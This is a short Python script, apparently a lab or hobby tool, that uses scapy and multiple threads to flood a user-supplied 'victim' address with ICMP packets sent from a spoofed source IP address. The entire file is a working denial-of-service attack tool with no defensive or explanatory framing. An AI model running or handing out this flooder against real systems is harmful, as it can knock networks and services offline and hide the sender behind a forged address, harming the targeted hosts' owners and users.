from scapy.all import *
import threading


def icmp (i, ip):
    while True:
        print("Thread: ", i)
        send(IP(src="192.168.248.110", dst=ip)/ICMP())

threadList = list()

ip = input("Nhap dia chi nan nhan: ")
thr = int(input("Threading: "))

for i in range(thr) :
    thrIcmp = threading.Thread(target = icmp, args = (i, ip))
    threadList.append(thrIcmp)
    thrIcmp.start()
